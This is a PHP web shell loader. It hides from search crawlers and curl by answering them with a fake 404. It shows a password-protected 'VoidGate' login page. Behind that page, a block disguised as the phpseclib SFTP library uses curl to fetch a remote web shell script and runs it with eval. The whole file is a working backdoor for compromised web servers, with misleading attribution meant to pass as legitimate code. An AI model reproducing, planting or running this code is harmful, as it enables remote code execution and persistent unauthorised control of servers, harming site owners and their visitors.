<?php
session_start();
@error_reporting(0);
@set_time_limit(0);

$hashedPassword = "968396fe1bd4f120ea8a47eff709025a";

if (!empty($_SERVER['HTTP_USER_AGENT'])) {
    $bots = ['Googlebot', 'Slurp', 'MSNBot', 'PycURL', 'facebookexternalhit', 'ia_archiver', 'crawler', 'Yandex', 'Rambler', 'Yahoo! Slurp', 'YahooSeeker', 'bingbot', 'curl'];
    if (preg_match('/' . implode('|', $bots) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

function login_shell($error = '') {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="robots" content="noindex, nofollow">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>ヤミRoot VoidGate</title>
        <link href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap" rel="stylesheet">
        <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
        <style>
            :root {
                --bg: #0a0a0f;
                --fg: #E0FF00;
                --highlight: #FF00C8;
                --link: #00FFF7;
                --link-hover: #FF00A0;
                --input-bg: #120024;
                --input-fg: #00FFB2;
                --font: 'Orbitron', sans-serif;
                --error: #FF0033;
            }

            * { box-sizing: border-box; margin: 0; padding: 0; }
            body {
                background-color: var(--bg);
                font-family: var(--font);
                color: var(--fg);
                height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
            }

            .login-container {
                width: 320px;
                text-align: center;
            }

            h1 {
                font-size: 1.5rem;
                margin-bottom: 20px;
                color: var(--highlight);
            }

            input[type="password"] {
                width: 100%;
                padding: 12px;
                margin: 15px 0;
                background-color: var(--input-bg);
                color: var(--input-fg);
                font-size: 1rem;
                border: none;
                outline: none;
                text-align: center;
                transition: background 0.3s;
            }

            input[type="password"]::placeholder {
                color: #555;
            }

            button {
                background: var(--link);
                color: #000;
                font-weight: bold;
                border: none;
                padding: 10px 20px;
                cursor: pointer;
                transition: 0.3s;
            }

            button:hover {
                background: var(--link-hover);
                color: #fff;
            }

            .error {
                color: var(--error);
                font-size: 0.9rem;
                margin-top: 10px;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h1>ヤミRoot VoidGate</h1>
            <form method="POST">
                <input type="password" name="password" placeholder="Enter Access Key" required>
                <button type="submit" name="login">ENTER</button>
            </form>

            <?php if (!empty($error)): ?>
                <div class="error"><?= htmlspecialchars($error) ?></div>
                <script>
                    Swal.fire({
                        icon: 'error',
                        title: 'ACCESS DENIED',
                        text: '<?= addslashes($error) ?>',
                        background: '#0a0a0f',
                        color: '#FF0033',
                        confirmButtonColor: '#FF00A0'
                    });
                </script>
            <?php endif; ?>
        </div>
    </body>
    </html>
    <?php
    exit;
}

$sessionKey = md5($_SERVER['HTTP_HOST']);

if (!isset($_SESSION[$sessionKey])) {
    if (isset($_POST['password'])) {
        if (md5($_POST['password']) === $hashedPassword) {
            $_SESSION[$sessionKey] = true;
        } else {
            login_shell("Invalid password.");
        }
    } else {
        login_shell();
    }
}
?>
<?php
/**
 * Pure-PHP implementations of SFTP.
 *
 * @package SFTP
 * @author  Jim Wigginton <terrafrost@php.net>
 * @access  public
 */
 $Url = 'https://raw.githubusercontent.com/6ickzone/0x6NyxWebShell/refs/heads/main/void.php';
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $Url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);
    echo eval('?>'.$output);

?>
